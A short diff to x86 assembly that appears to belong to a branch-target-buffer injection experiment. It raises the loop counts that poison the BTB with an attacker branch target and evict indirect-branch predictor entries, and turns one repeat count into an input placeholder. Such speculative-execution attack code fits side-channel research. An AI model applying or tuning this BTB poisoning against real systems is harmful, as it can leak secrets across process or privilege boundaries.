@@ -5,7 +5,7 @@
 
 %define nthreads 1
 %define repeat0  5
-%define repeat1  1000
+%define repeat1  repeat1_input
 %define repeat2  1
 %define noptype  2
 
@@ -42,7 +42,7 @@
     %endrep
 
     ; inject the malicious target into the BTB entry
-    %rep 15 * inject_btb
+    %rep 20 * inject_btb
         mov rax, sec_attacker_ibranch_addr
         call rax 
     %endrep
@@ -112,7 +112,7 @@ inject_t:   ; aliased with the malicious target in victim in the lowest 32 bits
 SECTION .sec_attacker_evict exec
 attacker_evict:
     %assign i 10
-    %rep 2*evict_ibp
+    %rep 6*evict_ibp
         mov rdx, qword[UserData+8]
         lea r10, [attacker_target_0_%+ i]
         lea r9, [attacker_target_1_%+ i]
